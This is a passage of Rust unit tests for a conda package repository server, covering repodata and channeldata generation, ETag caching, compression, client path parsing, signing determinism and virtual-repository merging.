            let filename = artifact.path.rsplit('/').next().unwrap();
            let entry = build_repodata_entry(
                &artifact.name,
                artifact.version.as_deref().unwrap_or("0"),
                "0",
                0,
                &serde_json::json!(["python >=3.8"]),
                "",
                "sha",
                100,
                "linux-64",
            );
            packages_conda.insert(filename.to_string(), entry);
        }

        let rd = build_repodata_json("linux-64", &serde_json::Map::new(), &packages_conda);
        let elapsed = start.elapsed();

        assert!(
            elapsed.as_millis() < 5000,
            "1000-package repodata should generate in < 5s, took {}ms",
            elapsed.as_millis()
        );
        assert_eq!(rd["packages.conda"].as_object().unwrap().len(), 1000);
    }

    #[test]
    fn test_repodata_json_serializes_with_content_length() {
        let mut packages = serde_json::Map::new();
        packages.insert(
            "test-1.0-0.tar.bz2".to_string(),
            build_repodata_entry(
                "test",
                "1.0",
                "0",
                0,
                &serde_json::json!([]),
                "",
                "sha",
                100,
                "linux-64",
            ),
        );
        let mut packages_conda = serde_json::Map::new();
        packages_conda.insert(
            "test2-2.0-0.conda".to_string(),
            build_repodata_entry(
                "test2",
                "2.0",
                "0",
                0,
                &serde_json::json!([]),
                "",
                "sha",
                200,
                "linux-64",
            ),
        );

        let rd = build_repodata_json("linux-64", &packages, &packages_conda);
        let body = serde_json::to_string_pretty(&rd).unwrap();

        // Content-Length should be deterministic and correct
        assert!(!body.is_empty());
        let body2 = serde_json::to_string_pretty(&rd).unwrap();
        assert_eq!(
            body.len(),
            body2.len(),
            "Serialized size should be deterministic"
        );
    }

    // -----------------------------------------------------------------------
    // HTTP Caching: ETag, Cache-Control, conditional requests (bead: artifact-keeper-76g)
    // -----------------------------------------------------------------------

    #[test]
    fn test_compute_etag_deterministic() {
        let body = b"some repodata content";
        let etag1 = compute_etag(body);
        let etag2 = compute_etag(body);
        assert_eq!(
            etag1, etag2,
            "ETag should be deterministic for same content"
        );
    }

    #[test]
    fn test_compute_etag_format() {
        let etag = compute_etag(b"test");
        assert!(
            etag.starts_with('"'),
            "ETag should start with quote: {}",
            etag
        );
        assert!(etag.ends_with('"'), "ETag should end with quote: {}", etag);
        // "<64 hex chars>" (full SHA-256)
        assert_eq!(
            etag.len(),
            1 + 64 + 1,
            "ETag should be quote + 64 hex + quote"
        );
    }

    #[test]
    fn test_compute_etag_changes_with_content() {
        let etag1 = compute_etag(b"content A");
        let etag2 = compute_etag(b"content B");
        assert_ne!(
            etag1, etag2,
            "Different content should produce different ETags"
        );
    }

    #[test]
    fn test_check_conditional_request_matches() {
        let etag = compute_etag(b"test body");
        let mut headers = HeaderMap::new();
        headers.insert(IF_NONE_MATCH, etag.parse().unwrap());

        let result = check_conditional_request(&headers, &etag);
        assert!(result.is_some(), "Matching ETag should return 304");
        let resp = result.unwrap();
        assert_eq!(resp.status(), StatusCode::NOT_MODIFIED);
    }

    #[test]
    fn test_check_conditional_request_no_match() {
        let etag = compute_etag(b"test body");
        let mut headers = HeaderMap::new();
        headers.insert(IF_NONE_MATCH, "W/\"different\"".parse().unwrap());

        let result = check_conditional_request(&headers, &etag);
        assert!(result.is_none(), "Non-matching ETag should return None");
    }

    #[test]
    fn test_check_conditional_request_wildcard() {
        let etag = compute_etag(b"anything");
        let mut headers = HeaderMap::new();
        headers.insert(IF_NONE_MATCH, "*".parse().unwrap());

        let result = check_conditional_request(&headers, &etag);
        assert!(result.is_some(), "Wildcard should match any ETag");
    }

    #[test]
    fn test_check_conditional_request_no_header() {
        let etag = compute_etag(b"test body");
        let headers = HeaderMap::new();

        let result = check_conditional_request(&headers, &etag);
        assert!(
            result.is_none(),
            "No If-None-Match header should return None"
        );
    }

    #[tokio::test]
    async fn test_cacheable_response_includes_etag() {
        let body = b"repodata json content".to_vec();
        let headers = HeaderMap::new();
        let resp = cacheable_response(body.clone(), "application/json", &headers).await;

        assert_eq!(resp.status(), StatusCode::OK);
        assert!(
            resp.headers().get(ETAG).is_some(),
            "Response should have ETag"
        );
        assert!(
            resp.headers().get(CACHE_CONTROL).is_some(),
            "Response should have Cache-Control"
        );
        assert_eq!(
            resp.headers().get(CACHE_CONTROL).unwrap().to_str().unwrap(),
            "public, max-age=60"
        );
    }

    #[tokio::test]
    async fn test_cacheable_response_304_on_matching_etag() {
        let body = b"repodata json content".to_vec();
        let etag = compute_etag(&body);
        let mut headers = HeaderMap::new();
        headers.insert(IF_NONE_MATCH, etag.parse().unwrap());

        let resp = cacheable_response(body, "application/json", &headers).await;
        assert_eq!(resp.status(), StatusCode::NOT_MODIFIED);
    }

    #[tokio::test]
    async fn test_cacheable_response_200_on_stale_etag() {
        let body = b"updated repodata json content".to_vec();
        let mut headers = HeaderMap::new();
        headers.insert(IF_NONE_MATCH, "W/\"stale_etag_value\"".parse().unwrap());

        let resp = cacheable_response(body, "application/json", &headers).await;
        assert_eq!(resp.status(), StatusCode::OK);
    }

    #[test]
    fn test_check_conditional_request_comma_separated_etags() {
        let etag = compute_etag(b"test body");
        let mut headers = HeaderMap::new();
        let header_val = format!("W/\"old\", {}, W/\"other\"", etag);
        headers.insert(IF_NONE_MATCH, header_val.parse().unwrap());

        let result = check_conditional_request(&headers, &etag);
        assert!(
            result.is_some(),
            "ETag in comma-separated list should match"
        );
    }

    #[test]
    fn test_bzip2_compression_ratio() {
        // Real repodata.json is highly compressible (lots of repeated field names)
        let mut packages = serde_json::Map::new();
        for i in 0..100 {
            packages.insert(
                format!("pkg{}-1.0-0.tar.bz2", i),
                serde_json::json!({
                    "name": format!("pkg{}", i),
                    "version": "1.0",
                    "build": "0",
                    "build_number": 0,
                    "depends": ["python >=3.8", "numpy >=1.22"],
                    "constrains": [],
                    "license": "MIT",
                    "md5": "abc123",
                    "sha256": format!("sha256_{}", i),
                    "size": 10240,
                    "subdir": "linux-64",
                }),
            );
        }

        let rd = build_repodata_json("linux-64", &packages, &serde_json::Map::new());
        let json_bytes = serde_json::to_vec(&rd).unwrap();
        let compressed = bzip2_compress(&json_bytes);

        let ratio = json_bytes.len() as f64 / compressed.len() as f64;
        assert!(
            ratio > 5.0,
            "bzip2 compression ratio should be > 5x for repodata, got {:.1}x ({} -> {} bytes)",
            ratio,
            json_bytes.len(),
            compressed.len()
        );
    }

    #[test]
    fn test_zstd_compression_ratio() {
        // zstd should also compress well
        let mut packages = serde_json::Map::new();
        for i in 0..100 {
            packages.insert(
                format!("pkg{}-1.0-0.conda", i),
                serde_json::json!({
                    "name": format!("pkg{}", i),
                    "version": "1.0",
                    "build": "0",
                    "build_number": 0,
                    "depends": ["python >=3.8", "numpy >=1.22"],
                    "constrains": [],
                    "license": "MIT",
                    "md5": "abc123",
                    "sha256": format!("sha256_{}", i),
                    "size": 10240,
                    "subdir": "linux-64",
                }),
            );
        }

        let rd = build_repodata_json("linux-64", &serde_json::Map::new(), &packages);
        let json_bytes = serde_json::to_vec(&rd).unwrap();
        let compressed = zstd_compress(&json_bytes).unwrap();

        let ratio = json_bytes.len() as f64 / compressed.len() as f64;
        assert!(
            ratio > 5.0,
            "zstd compression ratio should be > 5x for repodata, got {:.1}x ({} -> {} bytes)",
            ratio,
            json_bytes.len(),
            compressed.len()
        );
    }

    #[test]
    fn test_zstd_faster_decompression_than_bzip2() {
        // zstd decompression should be significantly faster than bzip2
        let mut packages = serde_json::Map::new();
        for i in 0..500 {
            packages.insert(
                format!("pkg{}-1.0-0.conda", i),
                serde_json::json!({
                    "name": format!("pkg{}", i),
                    "version": "1.0",
                    "build": "0",
                    "build_number": 0,
                    "depends": ["python >=3.8", "numpy >=1.22", "scipy >=1.7"],
                    "md5": "abc123",
                    "sha256": format!("sha256_{}", i),
                    "size": 10240,
                    "subdir": "linux-64",
                }),
            );
        }

        let rd = build_repodata_json("linux-64", &serde_json::Map::new(), &packages);
        let json_bytes = serde_json::to_vec(&rd).unwrap();

        let bz2_compressed = bzip2_compress(&json_bytes);
        let zstd_compressed = zstd_compress(&json_bytes).unwrap();

        // Time bzip2 decompression
        let start = std::time::Instant::now();
        for _ in 0..10 {
            let decoder = bzip2::read::BzDecoder::new(std::io::Cursor::new(&bz2_compressed));
            let mut output = Vec::new();
            std::io::Read::read_to_end(&mut std::io::BufReader::new(decoder), &mut output).unwrap();
        }
        let bz2_time = start.elapsed();

        // Time zstd decompression
        let start = std::time::Instant::now();
        for _ in 0..10 {
            zstd::decode_all(std::io::Cursor::new(&zstd_compressed)).unwrap();
        }
        let zstd_time = start.elapsed();

        // zstd should be at least 2x faster than bzip2 for decompression
        assert!(
            zstd_time < bz2_time,
            "zstd decompression ({:?}) should be faster than bzip2 ({:?})",
            zstd_time,
            bz2_time
        );
    }

    #[test]
    fn test_current_repodata_only_latest_versions() {
        // Simulate multiple versions of the same package
        let artifacts = vec![
            make_full_conda_artifact("numpy", "1.24.0", "py312_0", "linux-64", "conda", 1000),
            make_full_conda_artifact("numpy", "1.25.0", "py312_0", "linux-64", "conda", 1000),
            make_full_conda_artifact("numpy", "1.26.4", "py312_0", "linux-64", "conda", 1000),
            make_full_conda_artifact("scipy", "1.10.0", "py312_0", "linux-64", "conda", 1000),
            make_full_conda_artifact("scipy", "1.11.4", "py312_0", "linux-64", "conda", 1000),
        ];

        let filtered = artifacts_for_subdir(&artifacts, "linux-64");
        assert_eq!(filtered.len(), 5);

        // Simulate latest_only filtering (what current_repodata.json does)
        let mut latest: BTreeMap<String, &CondaArtifact> = BTreeMap::new();
        for a in &filtered {
            let name = a
                .metadata
                .as_ref()
                .and_then(|m| m.get("name").and_then(|v| v.as_str()))
                .unwrap_or(&a.name)
                .to_string();
            // First occurrence wins (simulating ORDER BY created_at DESC)
            latest.entry(name).or_insert(a);
        }

        // Should only have 2 unique package names
        assert_eq!(latest.len(), 2);
        assert!(latest.contains_key("numpy"));
        assert!(latest.contains_key("scipy"));
    }

    #[test]
    fn test_repodata_mixed_v1_v2_same_package() {
        // Same package available as both v1 and v2 (common during migration)
        let v1 = make_conda_artifact(
            "numpy",
            "linux-64/numpy-1.26.4-py312_0.tar.bz2",
            Some(serde_json::json!({
                "name": "numpy",
                "version": "1.26.4",
                "build": "py312_0",
                "build_number": 0,
                "depends": ["python >=3.12"],
                "subdir": "linux-64",
                "package_format": "v1"
            })),
        );
        let v2 = make_conda_artifact(
            "numpy",
            "linux-64/numpy-1.26.4-py312_0.conda",
            Some(serde_json::json!({
                "name": "numpy",
                "version": "1.26.4",
                "build": "py312_0",
                "build_number": 0,
                "depends": ["python >=3.12"],
                "subdir": "linux-64",
                "package_format": "v2"
            })),
        );

        let artifacts = vec![v1, v2];
        let filtered = artifacts_for_subdir(&artifacts, "linux-64");
        assert_eq!(filtered.len(), 2);

        // Both should appear in repodata but in different sections
        let mut packages = serde_json::Map::new();
        let mut packages_conda = serde_json::Map::new();

        for a in &filtered {
            let filename = a.path.rsplit('/').next().unwrap();
            let entry = serde_json::json!({"name": "numpy", "version": "1.26.4"});
            if is_conda_v2(filename) {
                packages_conda.insert(filename.to_string(), entry);
            } else {
                packages.insert(filename.to_string(), entry);
            }
        }

        assert_eq!(packages.len(), 1);
        assert_eq!(packages_conda.len(), 1);
    }

    // =======================================================================
    // Channeldata.json compliance (bead: artifact-keeper-0p3)
    // =======================================================================

    #[test]
    fn test_channeldata_multiple_packages_with_subdirs() {
        let mut packages = serde_json::Map::new();

        // numpy in linux-64 and osx-arm64
        packages.insert(
            "numpy".to_string(),
            build_channeldata_package_entry(
                &["linux-64".to_string(), "osx-arm64".to_string()],
                "1.26.4",
            ),
        );
        // requests in noarch only
        packages.insert(
            "requests".to_string(),
            build_channeldata_package_entry(&["noarch".to_string()], "2.31.0"),
        );
        // scipy in multiple platforms
        packages.insert(
            "scipy".to_string(),
            build_channeldata_package_entry(
                &[
                    "linux-64".to_string(),
                    "osx-64".to_string(),
                    "osx-arm64".to_string(),
                    "win-64".to_string(),
                ],
                "1.11.4",
            ),
        );

        let cd = build_channeldata_json(&packages);

        assert_eq!(cd["channeldata_version"], 1);
        assert_eq!(cd["packages"].as_object().unwrap().len(), 3);

        // Verify numpy entry
        let numpy = &cd["packages"]["numpy"];
        assert_eq!(numpy["version"], "1.26.4");
        assert_eq!(numpy["subdirs"].as_array().unwrap().len(), 2);

        // Verify scipy entry has all 4 subdirs
        let scipy = &cd["packages"]["scipy"];
        assert_eq!(scipy["subdirs"].as_array().unwrap().len(), 4);
    }

    #[test]
    fn test_channeldata_version_is_integer_1() {
        let cd = build_channeldata_json(&serde_json::Map::new());
        assert!(cd["channeldata_version"].is_number());
        assert_eq!(cd["channeldata_version"].as_u64(), Some(1));
    }

    #[test]
    fn test_channeldata_subdirs_is_complete_array() {
        let cd = build_channeldata_json(&serde_json::Map::new());
        let subdirs: Vec<&str> = cd["subdirs"]
            .as_array()
            .unwrap()
            .iter()
            .filter_map(|v| v.as_str())
            .collect();

        // Must have all standard subdirs
        assert!(subdirs.contains(&"noarch"), "Missing noarch");
        assert!(subdirs.contains(&"linux-64"), "Missing linux-64");
        assert!(subdirs.contains(&"linux-aarch64"), "Missing linux-aarch64");
        assert!(subdirs.contains(&"osx-64"), "Missing osx-64");
        assert!(subdirs.contains(&"osx-arm64"), "Missing osx-arm64");
        assert!(subdirs.contains(&"win-64"), "Missing win-64");
    }

    #[test]
    fn test_channeldata_packages_key_is_object() {
        let cd = build_channeldata_json(&serde_json::Map::new());
        assert!(cd["packages"].is_object());
    }

    // =======================================================================
    // Notices.json (CEP-6) tests (bead: artifact-keeper-dsk)
    // =======================================================================

    #[test]
    fn test_notices_json_structure() {
        // The notices.json endpoint should return a JSON object with a "notices" array
        let notices = serde_json::json!({ "notices": [] });
        assert!(notices["notices"].is_array());
        assert!(notices["notices"].as_array().unwrap().is_empty());
    }

    #[test]
    fn test_notices_json_with_entries() {
        // When notices exist, each should have id, message, level, created_at
        let notices = serde_json::json!({
            "notices": [
                {
                    "id": "notice-001",
                    "message": "This channel is deprecated. Please migrate to channel-v2.",
                    "level": "warning",
                    "created_at": "2026-01-15T00:00:00Z"
                },
                {
                    "id": "notice-002",
                    "message": "Scheduled maintenance on 2026-02-01.",
                    "level": "info",
                    "created_at": "2026-01-20T00:00:00Z"
                }
            ]
        });
        let arr = notices["notices"].as_array().unwrap();
        assert_eq!(arr.len(), 2);
        assert_eq!(arr[0]["level"], "warning");
        assert_eq!(arr[1]["level"], "info");
    }

    // =======================================================================
    // Run exports (CEP-12) tests (bead: artifact-keeper-mya)
    // =======================================================================

    #[test]
    fn test_run_exports_json_structure() {
        // run_exports.json should have info.subdir and packages map
        let re = serde_json::json!({
            "info": { "subdir": "linux-64" },
            "packages": {},
        });
        assert_eq!(re["info"]["subdir"], "linux-64");
        assert!(re["packages"].is_object());
    }

    #[test]
    fn test_run_exports_json_with_package_data() {
        // Packages with run_exports should include the data
        let re = serde_json::json!({
            "info": { "subdir": "linux-64" },
            "packages": {
                "numpy-1.26.4-py312h_0.conda": {
                    "run_exports": {
                        "weak": ["numpy >=1.26.4,<2.0a0"]
                    }
                }
            },
        });
        let pkg = &re["packages"]["numpy-1.26.4-py312h_0.conda"];
        assert!(pkg["run_exports"]["weak"].is_array());
    }

    #[test]
    fn test_run_exports_empty_for_package_without_exports() {
        // Packages without run_exports should have empty object
        let re = serde_json::json!({
            "info": { "subdir": "noarch" },
            "packages": {
                "six-1.16.0-pyh_0.conda": {
                    "run_exports": {}
                }
            },
        });
        let pkg = &re["packages"]["six-1.16.0-pyh_0.conda"];
        assert!(pkg["run_exports"].as_object().unwrap().is_empty());
    }

    // =======================================================================
    // Patch instructions tests (bead: artifact-keeper-at5)
    // =======================================================================

    #[test]
    fn test_patch_instructions_json_structure() {
        let pi = serde_json::json!({
            "info": { "subdir": "linux-64" },
            "packages": {},
            "packages.conda": {},
            "remove": [],
            "revoke": [],
        });
        assert_eq!(pi["info"]["subdir"], "linux-64");
        assert!(pi["packages"].is_object());
        assert!(pi["packages.conda"].is_object());
        assert!(pi["remove"].is_array());
        assert!(pi["revoke"].is_array());
    }

    #[test]
    fn test_patch_instructions_with_patches() {
        // When patch instructions exist, they override fields in repodata entries
        let pi = serde_json::json!({
            "info": { "subdir": "linux-64" },
            "packages": {
                "numpy-1.25.0-py312_0.tar.bz2": {
                    "depends": ["python >=3.12,<3.13.0a0", "libopenblas >=0.3.27"]
                }
            },
            "packages.conda": {},
            "remove": ["old-pkg-0.1-0.tar.bz2"],
            "revoke": ["vulnerable-pkg-1.0-0.conda"],
        });
        let patches = pi["packages"].as_object().unwrap();
        assert_eq!(patches.len(), 1);
        assert_eq!(pi["remove"].as_array().unwrap().len(), 1);
        assert_eq!(pi["revoke"].as_array().unwrap().len(), 1);
    }

    // =======================================================================
    // Enriched channeldata tests (bead: artifact-keeper-vtf)
    // =======================================================================

    #[test]
    fn test_channeldata_includes_license_when_available() {
        // Channeldata should include license info from package metadata
        let cd = serde_json::json!({
            "channeldata_version": 1,
            "packages": {
                "numpy": {
                    "subdirs": ["linux-64"],
                    "version": "1.26.4",
                    "license": "BSD-3-Clause",
                    "license_family": "BSD",
                    "home": "https://numpy.org",
                    "summary": "Fundamental package for scientific computing"
                }
            },
            "subdirs": KNOWN_SUBDIRS,
        });
        let pkg = &cd["packages"]["numpy"];
        assert_eq!(pkg["license"], "BSD-3-Clause");
        assert_eq!(pkg["license_family"], "BSD");
        assert_eq!(pkg["home"], "https://numpy.org");
        assert_eq!(
            pkg["summary"],
            "Fundamental package for scientific computing"
        );
    }

    #[test]
    fn test_channeldata_optional_fields_omitted_when_empty() {
        // Fields should only be present when we have data
        let cd = serde_json::json!({
            "channeldata_version": 1,
            "packages": {
                "simple-pkg": {
                    "subdirs": ["noarch"],
                    "version": "1.0"
                }
            },
            "subdirs": KNOWN_SUBDIRS,
        });
        let pkg = &cd["packages"]["simple-pkg"];
        assert!(pkg.get("license").is_none());
        assert!(pkg.get("home").is_none());
        assert!(pkg.get("description").is_none());
    }

    // =======================================================================
    // Client compatibility tests (bead: artifact-keeper-afv)
    //
    // These verify URL/path patterns that conda, mamba, and micromamba
    // clients actually request.
    // =======================================================================

    #[test]
    fn test_conda_client_repodata_path_format() {
        // conda requests: /{channel}/{subdir}/repodata.json
        let path = "linux-64/repodata.json";
        let info = crate::formats::conda_native::CondaNativeHandler::parse_path(path).unwrap();
        assert!(info.is_index);
        assert_eq!(info.subdir.as_deref(), Some("linux-64"));
    }

    #[test]
    fn test_conda_client_channeldata_path() {
        // conda requests: /{channel}/channeldata.json
        let info = crate::formats::conda_native::CondaNativeHandler::parse_path("channeldata.json")
            .unwrap();
        assert!(info.is_index);
        assert!(info.subdir.is_none());
    }

    #[test]
    fn test_conda_client_v2_download_path() {
        // mamba/conda request: /{channel}/{subdir}/{name}-{ver}-{build}.conda
        let info = crate::formats::conda_native::CondaNativeHandler::parse_path(
            "linux-64/numpy-1.26.4-py312h02b7e37_0.conda",
        )
        .unwrap();
        assert!(!info.is_index);
        assert_eq!(info.name.as_deref(), Some("numpy"));
        assert_eq!(info.version.as_deref(), Some("1.26.4"));
        assert_eq!(info.build.as_deref(), Some("py312h02b7e37_0"));
    }

    #[test]
    fn test_conda_client_v1_download_path() {
        // older conda: /{channel}/{subdir}/{name}-{ver}-{build}.tar.bz2
        let info = crate::formats::conda_native::CondaNativeHandler::parse_path(
            "noarch/requests-2.31.0-pyhd8ed1ab_0.tar.bz2",
        )
        .unwrap();
        assert!(!info.is_index);
        assert_eq!(info.name.as_deref(), Some("requests"));
        assert_eq!(info.subdir.as_deref(), Some("noarch"));
    }

    #[test]
    fn test_mamba_prefers_zst_endpoint() {
        // mamba/micromamba request repodata.json.zst first, fallback to .json
        // Verify our handler has an endpoint for it (test that zst_compress works)
        let data = br#"{"info":{"subdir":"linux-64"},"packages":{}}"#;
        let compressed = zstd_compress(data).unwrap();
        assert!(!compressed.is_empty());
        // Verify it decompresses correctly
        let decompressed = zstd::decode_all(std::io::Cursor::new(&compressed)).unwrap();
        assert_eq!(decompressed, data);
    }

    #[test]
    fn test_all_known_subdirs_are_valid_for_client_paths() {
        // Every known subdir should parse correctly as part of a conda path
        for subdir in KNOWN_SUBDIRS {
            let path = format!("{}/test-1.0-0.conda", subdir);
            let info = crate::formats::conda_native::CondaNativeHandler::parse_path(&path).unwrap();
            assert_eq!(info.subdir.as_deref(), Some(*subdir));
        }
    }

    #[test]
    fn test_condarc_url_patterns() {
        // .condarc channel URLs: https://host/conda/{repo_key}
        // conda appends /{subdir}/repodata.json automatically
        // Verify our path parsing handles the subdir/filename part correctly
        let paths = vec![
            "noarch/repodata.json",
            "linux-64/repodata.json",
            "linux-64/repodata.json.bz2",
            "noarch/pip-24.0-pyhd8ed1ab_0.conda",
            "linux-64/numpy-1.26.4-py312h02b7e37_0.tar.bz2",
        ];

        for path in paths {
            let result = crate::formats::conda_native::CondaNativeHandler::parse_path(path);
            assert!(
                result.is_ok(),
                "Failed to parse conda client path: {}",
                path
            );
        }
    }

    #[test]
    fn test_package_filename_with_hyphens_in_name() {
        // Many conda packages have hyphens: python-dateutil, scikit-learn
        let info = crate::formats::conda_native::CondaNativeHandler::parse_path(
            "noarch/python-dateutil-2.8.2-pyhd8ed1ab_0.tar.bz2",
        )
        .unwrap();
        assert_eq!(info.name.as_deref(), Some("python-dateutil"));
        assert_eq!(info.version.as_deref(), Some("2.8.2"));
    }

    #[test]
    fn test_package_filename_with_underscores() {
        let info = crate::formats::conda_native::CondaNativeHandler::parse_path(
            "linux-64/ca_certificates-2024.2.2-hbcca054_0.conda",
        )
        .unwrap();
        assert_eq!(info.name.as_deref(), Some("ca_certificates"));
        assert_eq!(info.version.as_deref(), Some("2024.2.2"));
    }

    #[test]
    fn test_package_filename_with_dots_in_version() {
        let info = crate::formats::conda_native::CondaNativeHandler::parse_path(
            "linux-64/openssl-3.2.0-hd590300_1.conda",
        )
        .unwrap();
        assert_eq!(info.name.as_deref(), Some("openssl"));
        assert_eq!(info.version.as_deref(), Some("3.2.0"));
        assert_eq!(info.build.as_deref(), Some("hd590300_1"));
    }

    // =======================================================================
    // Signing and verification (bead: artifact-keeper-xll)
    //
    // Unit tests for the signing key endpoint patterns and repodata
    // signature structure. Full signing verification requires DB/services
    // but we can test the response structure and key format expectations.
    // =======================================================================

    #[test]
    fn test_repodata_json_is_deterministic_for_signing() {
        // Signing requires deterministic serialization. The same repodata
        // should produce the same JSON bytes every time.
        let mut packages = serde_json::Map::new();
        packages.insert(
            "numpy-1.26.4-py312_0.conda".to_string(),
            serde_json::json!({
                "name": "numpy",
                "version": "1.26.4",
                "build": "py312_0",
                "build_number": 0,
                "depends": ["python >=3.12"],
                "sha256": "abc123",
                "size": 8192,
                "subdir": "linux-64",
            }),
        );

        let rd = build_repodata_json("linux-64", &serde_json::Map::new(), &packages);
        let bytes1 = serde_json::to_vec(&rd).unwrap();
        let bytes2 = serde_json::to_vec(&rd).unwrap();
        assert_eq!(
            bytes1, bytes2,
            "Repodata serialization must be deterministic"
        );
    }

    #[test]
    fn test_repodata_signing_changes_with_content() {
        // Different repodata should produce different bytes (and thus different sigs)
        let mut packages1 = serde_json::Map::new();
        packages1.insert(
            "pkg-1.0-0.conda".to_string(),
            serde_json::json!({"name": "pkg", "version": "1.0"}),
        );
        let rd1 = build_repodata_json("linux-64", &serde_json::Map::new(), &packages1);

        let mut packages2 = serde_json::Map::new();
        packages2.insert(
            "pkg-2.0-0.conda".to_string(),
            serde_json::json!({"name": "pkg", "version": "2.0"}),
        );
        let rd2 = build_repodata_json("linux-64", &serde_json::Map::new(), &packages2);

        let bytes1 = serde_json::to_vec(&rd1).unwrap();
        let bytes2 = serde_json::to_vec(&rd2).unwrap();
        assert_ne!(
            bytes1, bytes2,
            "Different content should produce different bytes"
        );
    }

    #[test]
    fn test_repodata_sha256_for_download_verification() {
        // Each package entry should have a sha256 field for download verification
        let entry = build_repodata_entry(
            "numpy",
            "1.26.4",
            "py312_0",
            0,
            &serde_json::json!([]),
            "md5hash",
            "abc123def456",
            8192,
            "linux-64",
        );
        assert_eq!(entry["sha256"], "abc123def456");
        assert!(!entry["sha256"].as_str().unwrap().is_empty());
    }

    // =======================================================================
    // Remote repository proxy path construction (bead: artifact-keeper-eo4)
    // =======================================================================

    #[test]
    fn test_proxy_upstream_path_v2_package() {
        // When proxying, we construct: {subdir}/{filename}
        let subdir = "linux-64";
        let filename = "numpy-1.26.4-py312h02b7e37_0.conda";
        let upstream_path = format!("{}/{}", subdir, filename);
        assert_eq!(upstream_path, "linux-64/numpy-1.26.4-py312h02b7e37_0.conda");
    }

    #[test]
    fn test_proxy_upstream_path_v1_package() {
        let subdir = "noarch";
        let filename = "requests-2.31.0-pyhd8ed1ab_0.tar.bz2";
        let upstream_path = format!("{}/{}", subdir, filename);
        assert_eq!(upstream_path, "noarch/requests-2.31.0-pyhd8ed1ab_0.tar.bz2");
    }

    #[test]
    fn test_proxy_upstream_path_repodata() {
        let subdir = "linux-64";
        let filename = "repodata.json";
        let upstream_path = format!("{}/{}", subdir, filename);
        assert_eq!(upstream_path, "linux-64/repodata.json");
    }

    #[test]
    fn test_proxy_content_type_for_formats() {
        // Proxy should use correct content type for each format
        assert_eq!(
            conda_package_content_type("numpy.conda"),
            "application/octet-stream"
        );
        assert_eq!(
            conda_package_content_type("requests.tar.bz2"),
            "application/x-tar"
        );
    }

    // =======================================================================
    // Virtual repository metadata merge (bead: artifact-keeper-rec)
    //
    // Test that repodata entries from multiple sources can be merged.
    // =======================================================================

    #[test]
    fn test_virtual_repodata_merge_different_packages() {
        // Local repo has numpy, remote has scipy - merged repodata has both
        let mut local_packages = serde_json::Map::new();
        local_packages.insert(
            "numpy-1.26.4-py312_0.conda".to_string(),
            serde_json::json!({
                "name": "numpy",
                "version": "1.26.4",
                "build": "py312_0",
                "build_number": 0,
                "depends": ["python >=3.12"],
                "sha256": "local_sha",
                "size": 8192,
                "subdir": "linux-64",
            }),
        );

        let mut remote_packages = serde_json::Map::new();
        remote_packages.insert(
            "scipy-1.11.4-py312_0.conda".to_string(),
            serde_json::json!({
                "name": "scipy",
                "version": "1.11.4",
                "build": "py312_0",
                "build_number": 0,
                "depends": ["numpy >=1.22", "python >=3.12"],
                "sha256": "remote_sha",
                "size": 16384,
                "subdir": "linux-64",
            }),
        );

        // Merge: local takes priority, then remote
        let mut merged = local_packages.clone();
        for (k, v) in &remote_packages {
            merged.entry(k.clone()).or_insert(v.clone());
        }

        let rd = build_repodata_json("linux-64", &serde_json::Map::new(), &merged);
        let pkgs = rd["packages.conda"].as_object().unwrap();
        assert_eq!(pkgs.len(), 2);
        assert!(pkgs.contains_key("numpy-1.26.4-py312_0.conda"));
        assert!(pkgs.contains_key("scipy-1.11.4-py312_0.conda"));
    }

    #[test]
    fn test_virtual_repodata_merge_priority_ordering() {
        // When same package exists in local and remote, local wins
        let mut local_packages = serde_json::Map::new();
        local_packages.insert(
            "numpy-1.26.4-py312_0.conda".to_string(),
            serde_json::json!({
                "name": "numpy",
                "version": "1.26.4",
                "sha256": "local_sha_wins",
                "size": 8192,
            }),
        );

        let mut remote_packages = serde_json::Map::new();
        remote_packages.insert(
            "numpy-1.26.4-py312_0.conda".to_string(),
            serde_json::json!({
                "name": "numpy",
                "version": "1.26.4",
                "sha256": "remote_sha_loses",
                "size": 8192,
            }),
        );

        // Priority merge: local first
        let mut merged = local_packages.clone();
        for (k, v) in &remote_packages {
            merged.entry(k.clone()).or_insert(v.clone());
        }

        assert_eq!(merged.len(), 1);
        assert_eq!(
            merged["numpy-1.26.4-py312_0.conda"]["sha256"],
            "local_sha_wins"
        );
    }

    #[test]
    fn test_virtual_repodata_merge_preserves_all_metadata_fields() {
        // After merge, all metadata fields should be intact
        let mut packages = serde_json::Map::new();
        packages.insert(
            "numpy-1.26.4-py312_0.conda".to_string(),
            serde_json::json!({
                "name": "numpy",
                "version": "1.26.4",
                "build": "py312_0",
                "build_number": 0,
                "depends": ["python >=3.12", "libcblas >=3.9"],
                "constrains": ["numpy-base <0a0"],
                "license": "BSD-3-Clause",
                "license_family": "BSD",
                "md5": "md5hash",
                "sha256": "sha256hash",
                "size": 8192,
                "subdir": "linux-64",
                "timestamp": 1709000000000_u64,
            }),
        );

        let rd = build_repodata_json("linux-64", &serde_json::Map::new(), &packages);
        let entry = &rd["packages.conda"]["numpy-1.26.4-py312_0.conda"];

        // Verify all fields survived the merge through repodata construction
        assert_eq!(entry["name"], "numpy");
        assert_eq!(entry["version"], "1.26.4");
        assert_eq!(entry["build"], "py312_0");
        assert_eq!(entry["build_number"], 0);
        assert_eq!(entry["depends"].as_array().unwrap().len(), 2);
        assert_eq!(entry["constrains"].as_array().unwrap().len(), 1);
        assert_eq!(entry["license"], "BSD-3-Clause");
        assert_eq!(entry["license_family"], "BSD");
        assert_eq!(entry["sha256"], "sha256hash");
        assert_eq!(entry["size"], 8192);
        assert_eq!(entry["timestamp"], 1709000000000_u64);
    }

    #[test]
    fn test_virtual_repodata_merge_mixed_v1_v2_sources() {
        // Virtual repo merges v1 from remote and v2 from local
        let mut packages = serde_json::Map::new();
        packages.insert(
            "old-pkg-1.0-0.tar.bz2".to_string(),
            serde_json::json!({"name": "old-pkg", "version": "1.0"}),
        );

        let mut packages_conda = serde_json::Map::new();
        packages_conda.insert(
            "new-pkg-2.0-0.conda".to_string(),
            serde_json::json!({"name": "new-pkg", "version": "2.0"}),
        );

        let rd = build_repodata_json("linux-64", &packages, &packages_conda);

        // v1 and v2 should be in their respective sections
        assert_eq!(rd["packages"].as_object().unwrap().len(), 1);
        assert_eq!(rd["packages.conda"].as_object().unwrap().len(), 1);
    }

    // =======================================================================
    // Pure helper tests: merge_package_maps, parse_upstream_*, build_channeldata_entry
    // =======================================================================

    #[test]
    fn test_merge_package_maps_adds_new_entries() {
        let mut target = serde_json::Map::new();
        target.insert("a".into(), serde_json::json!(1));

        let mut source = serde_json::Map::new();
